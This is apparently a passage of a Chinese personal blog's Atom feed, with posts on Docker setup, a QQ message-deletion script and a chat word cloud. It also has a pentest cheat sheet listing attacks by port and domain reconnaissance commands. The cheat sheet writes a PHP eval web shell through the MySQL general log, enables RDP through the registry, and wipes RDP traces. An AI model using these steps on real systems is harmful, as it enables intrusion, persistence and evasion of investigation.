class="line">WebDriverWait(self.__driver, <span class="number">10</span>).until(</span><br><span class="line">EC.frame_to_be_available_and_switch_to_it((By.XPATH, <span class="string">'//iframe[@id="tgb"]'</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除所有的留言</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteAll</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="comment"># totalPage = self.getTotalPage()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 留言板设置的sub_lsit</span></span><br><span class="line"><span class="comment"># WebDriverWait(driver, 10).until(</span></span><br><span class="line"><span class="comment"># EC.presence_of_element_located((By.XPATH, '//ul[@class="sub_list bg bor"]'))</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># # getElementsByClassName返回的是集合</span></span><br><span class="line"><span class="comment"># driver.execute_script('document.getElementsByClassName("sub_list bg bor")[0].style.display="block"')</span></span><br><span class="line"><span class="comment"># # 进入批量管理</span></span><br><span class="line"><span class="comment"># driver.find_element_by_id('btnBatch').click()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(self.getTotalPage()):</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 执行js语句可以直接设置id=divBatchOper元素的可见性来进入批量管理</span></span><br><span class="line">self.__driver.execute_script(<span class="string">'document.getElementById("divBatchOper").style.display="block"'</span>)</span><br><span class="line">self.__driver.find_element_by_id(<span class="string">'chkSelectAll'</span>).click()</span><br><span class="line">self.__driver.find_element_by_id(<span class="string">'btnDeleteBatchBottom'</span>).click()</span><br><span class="line">self.handlePopWin()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定qq的留言</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteByNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line"><span class="comment"># 显示批量管理</span></span><br><span class="line">self.__driver.execute_script(<span class="string">'document.getElementsByClassName("sub_list bg bor")[0].style.display="block"'</span>)</span><br><span class="line">self.__driver.find_element_by_id(<span class="string">'btnBatch'</span>).click()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">selectedItem = <span class="number">0</span></span><br><span class="line"><span class="comment"># 找到该页中所有的留言</span></span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> self.__driver.find_elements_by_xpath(<span class="string">'//li[@class="bor3"]'</span>):</span><br><span class="line"><span class="comment"># 如果输入的qq号在标签内，说明是该qq的留言，选中该条留言</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">in</span> li.get_attribute(<span class="string">'innerHTML'</span>):</span><br><span class="line">li.find_element_by_class_name(<span class="string">'item_check_box'</span>).click()</span><br><span class="line">selectedItem += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 滚动到顶部</span></span><br><span class="line">self.__driver.execute_script(<span class="string">'parent.scrollTo(0,200)'</span>)</span><br><span class="line"><span class="comment"># 该页中确实有目标qq的留言才进行删除</span></span><br><span class="line"><span class="keyword">if</span> selectedItem != <span class="number">0</span>:</span><br><span class="line"><span class="comment"># 点击 删除选中的 按钮</span></span><br><span class="line">self.__driver.find_element_by_id(<span class="string">'btnDeleteBatchBottom'</span>).click()</span><br><span class="line">self.handlePopWin(selectedItem)</span><br><span class="line"><span class="comment"># 该页中没有目标qq的留言处理下一页</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">nextBtn = WebDriverWait(self.__driver, <span class="number">10</span>).until(</span><br><span class="line">EC.presence_of_element_located((By.XPATH, <span class="string">'//div[@id="pager_top"]//p[@class="mod_pagenav_main"]/a[last()]'</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># print(nextBtn.get_attribute('class'))</span></span><br><span class="line"><span class="comment"># nextBtn = self.__driver.find_element_by_xpath('//div[@id="pager_top"]//p[@class="mod_pagenav_main"]/a[last()]')</span></span><br><span class="line"><span class="comment"># 还有下一页</span></span><br><span class="line"><span class="keyword">if</span> nextBtn.get_attribute(<span class="string">'class'</span>) == <span class="string">'c_tx'</span> <span class="keyword">or</span> nextBtn.get_attribute(<span class="string">'class'</span>) == <span class="string">'c_tx '</span>:</span><br><span class="line">print(<span class="string">'切换到下一页！'</span>)</span><br><span class="line">nextBtn.click()</span><br><span class="line"><span class="keyword">elif</span> nextBtn.get_attribute(<span class="string">'class'</span>) == <span class="string">'c_tx none'</span>:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self, num=None)</span>:</span></span><br><span class="line">self.login()</span><br><span class="line">self.switch2board()</span><br><span class="line"><span class="keyword">if</span> num:</span><br><span class="line">self.deleteByNum(num)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self.deleteAll()</span><br><span class="line">print(<span class="string">'删除完成'</span>)</span><br><span class="line">self.__driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># delete = Delete()</span></span><br><span class="line"><span class="comment"># delete.start()</span></span><br><span class="line">delete = Delete()</span><br><span class="line">delete.start()</span><br></pre></td></tr></table></figure><h2 id="马上情人节了，送大家一个二维码每日情话8"><a href="#马上情人节了，送大家一个二维码每日情话8" class="headerlink" title="马上情人节了，送大家一个二维码每日情话8"></a>马上情人节了，送大家一个二维码每日情话8</h2><p><img src="https://s2.ax1x.com/2020/02/12/1Hc2JP.png" alt="1Hc2JP.png"></p>]]></content>
    
    <summary type="html">
    
      QQ空间说说批量删除JS&amp;python删除留言
    
    </summary>
    
      <category term="杂七杂八" scheme="http://bobosec.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>docker从入门开始~</title>
    <link href="http://bobosec.top/2019/11/02/docker-start/"/>
    <id>http://bobosec.top/2019/11/02/docker-start/</id>
    <published>2019-11-02T14:14:42.000Z</published>
    <updated>2019-11-04T12:13:50.829Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker-在kail的搭建"><a href="#docker-在kail的搭建" class="headerlink" title="docker 在kail的搭建"></a>docker 在kail的搭建</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先要确定自己的kali是否能安装</p><p>Docker需要Linux Kernels 大于3.10并且是64-bit的机器，用uname -a可以查看是否符合要求。</p><h3 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h3><p>然后一般需要更新一下自己的kali源，命令如下：<code>apt-get update</code></p><p>这时候有可能会出现GPG key 过期的情况，所以还需要弄一个新的GPG key</p><p>命令：<code>wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</code></p><p>然后再输入：<code>apt-get update</code>更新</p><p>这里贴几个目前为止能用的源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#浙大</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#东软大学</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#重庆大学</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="准备安装"><a href="#准备安装" class="headerlink" title="准备安装"></a>准备安装</h3><p>在终端中输入：<code>vim /etc/apt/sources.list.d/backports.list</code>如果不会用vim的可以输入：<code>leafpad /etc/apt/sources.list.d/backports.list</code></p><p>在这里面添加如下代码：<code>deb http://http.debian.net/debian wheezy-backports main</code></p><p>然后刷新源： <code>apt-get update</code> </p><p>确认apt添加了https方法和CA cerificates：<code>apt-get install apt-transport-https ca-certificates</code></p><p>添加一个新的GPG key：<code>apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</code></p><p>等待加载完毕后，编辑文件：<code>vim /etc/apt/sources.list.d/docker.list</code></p><p>插入以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">deb https://apt.dockerproject.org/repo debian-wheezy main</span><br><span class="line">#On Debian Jessie</span><br><span class="line">#deb https://apt.dockerproject.org/repo debian-jessie main</span><br><span class="line">#On Debian Stretch/Sid</span><br><span class="line"></span><br><span class="line">#deb https://apt.dockerproject.org/repo debian-stretch main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存完毕后再一次更新源：<code>apt-get update</code></p><p>确认一下是否正确安装了repository：<code>apt-cache policy docker-engine</code></p><h3 id="开始安装-docker"><a href="#开始安装-docker" class="headerlink" title="开始安装 docker"></a>开始安装 docker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install docker-engine</span><br><span class="line"></span><br><span class="line">#安装结束，打开docker服务</span><br><span class="line"></span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line">#验证安装，运行测试样例</span><br><span class="line"></span><br><span class="line">docker run hello-world</span><br><span class="line"></span><br><span class="line">#如果没有错误就大功造成了！</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>安装完成后输入<code>docker info</code>查看一下自己的docker信息。</p><h1 id="docker入门啦"><a href="#docker入门啦" class="headerlink" title="docker入门啦~"></a>docker入门啦~</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>1.docker images //列出镜像</p><p>2.docker inspect 镜像名 //列出详细信息</p><p>3.docker rm 容器名【container】//删除容器</p><p>4.docker ps //列出运行的容器 </p><ol><li><p>docker ps -a //列出所有容器</p></li><li><p>docker logs [container] //查看结果</p></li><li><p>docker pause/stop [container] //暂停/终止容器</p></li><li><p>docker run [参数] image</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-t:为容器重新分配一个伪输入终端，通常与 -i 同时使用</span><br><span class="line">-i:以交互模式运行容器，通常与 -t 同时使用</span><br><span class="line">-d:后台运行容器，并返回容器ID</span><br><span class="line">--name:为容器指定一个名称</span><br><span class="line">-p:端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line">-v:挂载宿主机文件夹，格式为： 宿主机文件夹：容器文件夹</span><br><span class="line">--link: 添加链接到另一个容器</span><br><span class="line">-m:设置容器使用内存最大值；</span><br></pre></td></tr></table></figure></li><li><p>docker exec //进入容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line"></span><br><span class="line">-d : 分离模式: 在后台运行</span><br><span class="line"></span><br><span class="line">-i :  即使没有附加也保持STDIN 打开</span><br><span class="line"></span><br><span class="line">-t : 分配一个伪终端</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      docker入坑记录
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日益成长的小白" scheme="http://bobosec.top/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>爬虫入门</title>
    <link href="http://bobosec.top/2019/08/29/spider-start/"/>
    <id>http://bobosec.top/2019/08/29/spider-start/</id>
    <published>2019-08-29T09:15:05.000Z</published>
    <updated>2019-08-29T09:38:41.066Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read.">    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      爬虫从0开始
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="学一门语言" scheme="http://bobosec.top/tags/%E5%AD%A6%E4%B8%80%E9%97%A8%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>用聊天记录生成云图</title>
    <link href="http://bobosec.top/2019/08/07/qixi/"/>
    <id>http://bobosec.top/2019/08/07/qixi/</id>
    <published>2019-08-07T11:08:51.000Z</published>
    <updated>2019-08-07T11:17:24.106Z</updated>
    
    <content type="html"><![CDATA[<p>可以撩妹可以撩汉</p><p>直接贴代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud, ImageColorGenerator</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> PIL.Image <span class="keyword">as</span> Image</span><br><span class="line"></span><br><span class="line">newtext = []</span><br><span class="line"><span class="comment"># 打开当前目录下的聊天记录文件data.txt</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> open(<span class="string">'./data.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>):</span><br><span class="line">    tmp = word[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    <span class="keyword">if</span> (tmp == <span class="string">"2019"</span> <span class="keyword">or</span> tmp == <span class="string">"===="</span>):  <span class="comment"># 过滤掉聊天记录的时间和qq名称</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    tmp = word[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    <span class="keyword">if</span> (tmp[<span class="number">0</span>] == <span class="string">'['</span> <span class="keyword">or</span> tmp[<span class="number">0</span>] == <span class="string">'/'</span>):  <span class="comment"># 过滤掉图片和表情，例如[图片]，/可爱</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    newtext.append(word)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将过滤掉图片和表情和时间信息和qq名称剩下的文字重新写入当前目录下的a2.txt文件中去</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./a2.txt'</span>, <span class="string">'w'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> newtext:</span><br><span class="line">        f.write(i)</span><br><span class="line"><span class="comment"># 打开新生成的聊天记录文件</span></span><br><span class="line">text = open(<span class="string">'./a2.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>).read()</span><br><span class="line">word_jieba = jieba.cut(text, cut_all=<span class="keyword">True</span>)</span><br><span class="line">word_split = <span class="string">" "</span>.join(word_jieba)</span><br><span class="line"><span class="comment"># 找一张logo图来生成配色方案,logo图 timg1.jpg路径在当前目录下</span></span><br><span class="line">alice_coloring = np.array(Image.open(os.path.join(<span class="string">'./'</span>, <span class="string">'timg1.jpg'</span>)))</span><br><span class="line">my_wordcloud = WordCloud(background_color=<span class="string">"white"</span>, max_words=<span class="number">2000</span>, mask=alice_coloring,</span><br><span class="line">                         max_font_size=<span class="number">40</span>, random_state=<span class="number">42</span>,</span><br><span class="line">                         font_path=<span class="string">'C:/Windows/Fonts/simhei.ttf'</span>) \</span><br><span class="line">    .generate(word_split)</span><br><span class="line">image_colors = ImageColorGenerator(alice_coloring)</span><br><span class="line">plt.imshow(my_wordcloud.recolor(color_func=image_colors))</span><br><span class="line">plt.imshow(my_wordcloud)</span><br><span class="line">plt.axis(<span class="string">"off"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      用QQ聊天记录生成属于自己的云图
    
    </summary>
    
      <category term="Python" scheme="http://bobosec.top/categories/Python/"/>
    
    
      <category term="学一门语言" scheme="http://bobosec.top/tags/%E5%AD%A6%E4%B8%80%E9%97%A8%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>常见端口列表攻击方法</title>
    <link href="http://bobosec.top/2019/07/18/port/"/>
    <id>http://bobosec.top/2019/07/18/port/</id>
    <published>2019-07-18T03:38:47.000Z</published>
    <updated>2019-07-18T03:47:28.417Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口列表及攻击方法"><a href="#端口列表及攻击方法" class="headerlink" title="端口列表及攻击方法"></a>端口列表及攻击方法</h2><table><thead><tr><th style="text-align:left">端口号</th><th style="text-align:center">端口说明</th><th style="text-align:left">攻击技巧</th></tr></thead><tbody><tr><td style="text-align:left">21/22/69</td><td style="text-align:center">ftp/tftp：文件传输协议</td><td style="text-align:left">爆破\嗅探\溢出\后门</td></tr><tr><td style="text-align:left">22</td><td style="text-align:center">ssh：远程连接</td><td style="text-align:left">爆破OpenSSH；28个退格</td></tr><tr><td style="text-align:left">23</td><td style="text-align:center">telnet：远程连接</td><td style="text-align:left">爆破\嗅探</td></tr><tr><td style="text-align:left">25</td><td style="text-align:center">smtp：邮件服务</td><td style="text-align:left">邮件伪造</td></tr><tr><td style="text-align:left">53</td><td style="text-align:center">DNS：域名系统</td><td style="text-align:left">DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td style="text-align:left">67/68</td><td style="text-align:center">dhcp</td><td style="text-align:left">劫持\欺骗</td></tr><tr><td style="text-align:left">110</td><td style="text-align:center">pop3</td><td style="text-align:left">爆破</td></tr><tr><td style="text-align:left">139</td><td style="text-align:center">samba</td><td style="text-align:left">爆破\未授权访问\远程代码执行</td></tr><tr><td style="text-align:left">143</td><td style="text-align:center">imap</td><td style="text-align:left">爆破</td></tr><tr><td style="text-align:left">161</td><td style="text-align:center">snmp</td><td style="text-align:left">爆破</td></tr><tr><td style="text-align:left">389</td><td style="text-align:center">ldap</td><td style="text-align:left">注入攻击\未授权访问</td></tr><tr><td style="text-align:left">512/513/514</td><td style="text-align:center">linux r</td><td style="text-align:left">直接使用rlogin</td></tr><tr><td style="text-align:left">873</td><td style="text-align:center">rsync</td><td style="text-align:left">未授权访问</td></tr><tr><td style="text-align:left">1080</td><td style="text-align:center">socket</td><td style="text-align:left">爆破：进行内网渗透</td></tr><tr><td style="text-align:left">1352</td><td style="text-align:center">lotus</td><td style="text-align:left">爆破：弱口令\信息泄漏：源代码</td></tr><tr><td style="text-align:left">1433</td><td style="text-align:center">mssql</td><td style="text-align:left">爆破：使用系统用户登录\注入攻击</td></tr><tr><td style="text-align:left">1521</td><td style="text-align:center">oracle</td><td style="text-align:left">爆破：TNS\注入攻击</td></tr><tr><td style="text-align:left">2049</td><td style="text-align:center">nfs</td><td style="text-align:left">配置不当</td></tr><tr><td style="text-align:left">2181</td><td style="text-align:center">zookeeper</td><td style="text-align:left">未授权访问</td></tr><tr><td style="text-align:left">3306</td><td style="text-align:center">mysql</td><td style="text-align:left">爆破\拒绝服务\注入</td></tr><tr><td style="text-align:left">3389</td><td style="text-align:center">rdp</td><td style="text-align:left">爆破\Shift后门</td></tr><tr><td style="text-align:left">4848</td><td style="text-align:center">glassfish</td><td style="text-align:left">爆破：控制台弱口令\认证绕过</td></tr><tr><td style="text-align:left">5000</td><td style="text-align:center">sybase/DB2</td><td style="text-align:left">爆破\注入</td></tr><tr><td style="text-align:left">5432</td><td style="text-align:center">postgresql</td><td style="text-align:left">缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td style="text-align:left">5632</td><td style="text-align:center">pcanywhere</td><td style="text-align:left">拒绝服务\代码执行</td></tr><tr><td style="text-align:left">5900</td><td style="text-align:center">vnc</td><td style="text-align:left">爆破：弱口令\认证绕过</td></tr><tr><td style="text-align:left">6379</td><td style="text-align:center">redis</td><td style="text-align:left">未授权访问\爆破：弱口令</td></tr><tr><td style="text-align:left">7001</td><td style="text-align:center">weblogic</td><td style="text-align:left">Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td style="text-align:left">80/443/8080</td><td style="text-align:center">web</td><td style="text-align:left">常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td style="text-align:left">8069</td><td style="text-align:center">zabbix</td><td style="text-align:left">远程命令执行</td></tr><tr><td style="text-align:left">9090</td><td style="text-align:center">websphere控制台</td><td style="text-align:left">爆破：控制台弱口令\Java反序列</td></tr><tr><td style="text-align:left">9200/9300</td><td style="text-align:center">elasticsearch</td><td style="text-align:left">远程代码执行</td></tr><tr><td style="text-align:left">11211</td><td style="text-align:center">memcacache</td><td style="text-align:left">未授权访问</td></tr><tr><td style="text-align:left">27017</td><td style="text-align:center">mongodb</td><td style="text-align:left">爆破\未授权访问</td></tr></tbody></table><h2 id="windows域渗透常见指令"><a href="#windows域渗透常见指令" class="headerlink" title="windows域渗透常见指令"></a>windows域渗透常见指令</h2><p>ipconfig /all 查看本机IP，所在域</p><p>net user /domain 查询域用户</p><p>net group /domain —— 查询域里面的工作组</p><p>net group “domain admins” /domain —— 查询域管理员用户组</p><p>ping D1.com 查看域控的IPnltest /dclist:d1 查看域控名字</p><p>net time /domain 查看时间，域控机器名</p><p>net view 显示域中的计算机名列表</p><p>net view /domain:D1 显示指定域中机器名</p><p>net user /domain 查看当前域中的用户</p><p>net group “domain admins” /domain 查询域管理员用户组</p><p>net config workstation 显示更改可配置工作站参数，也可以获得登录域，机器名等信息</p><p>net accounts查看本地密码策略</p><p>netstat –an/ano/anb网络连接查询</p><p>route print路由表</p><p>dsquery，可以用来收集跨域的信息，但是跨域执行的前提是必须建立信任关系</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line">REG ADD <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v PortNumber /t REG_DWORD /d <span class="number">0</span>x00000d3d /f</span><br></pre></td></tr></table></figure><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><p>有apache phpmyadmin记下绝对路径<code>C:/phpStudy/PHPTutorial/WWW</code>。</p><p>尝试弱口令登入phpmyadmin然后日志写shell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">'%general%'</span>;</span><br><span class="line">set global general_log = on;</span><br><span class="line">set global general_log_file = <span class="string">'C:/phpStudy/PHPTutorial/WWW/shell.php'</span>;</span><br><span class="line">select <span class="string">'&lt;?php eval($_POST['</span>a<span class="string">']);?&gt;'</span></span><br></pre></td></tr></table></figure><h3 id="清除3389痕迹脚本"><a href="#清除3389痕迹脚本" class="headerlink" title="清除3389痕迹脚本"></a>清除3389痕迹脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">echo off</span><br><span class="line">color <span class="number">0</span>A</span><br><span class="line">title <span class="number">3389</span>连接痕迹清除</span><br><span class="line">mode con cols=<span class="number">88</span> lines=<span class="number">20</span></span><br><span class="line">set /p fk= 确定要清空<span class="number">3389</span>连接痕迹吗？(y/n)</span><br><span class="line"><span class="keyword">if</span> /i <span class="string">"%fk%"</span>==<span class="string">"y"</span> goto y</span><br><span class="line"><span class="keyword">if</span> /i <span class="string">"%fk%"</span>==<span class="string">"n"</span> goto n</span><br><span class="line">call %<span class="number">0</span></span><br><span class="line"></span><br><span class="line">:y</span><br><span class="line">reg delete <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client"</span> /f</span><br><span class="line">del /a /f /q %HOMEPATH%\Documents\Default.rdp</span><br><span class="line">echo 命令执行成功，请手动查看是否清除。</span><br><span class="line">pause &gt;nul</span><br><span class="line"></span><br><span class="line">:n</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      常见端口列表攻击方法总结方便以后查阅
    
    </summary>
    
      <category term="渗透测试" scheme="http://bobosec.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>Python山脚村的进阶之路</title>
    <link href="http://bobosec.top/2019/03/16/python-start/"/>
    <id>http://bobosec.top/2019/03/16/python-start/</id>
    <published>2019-03-16T12:54:57.000Z</published>
    <updated>2019-06-25T08:42:56.233Z</updated>
    
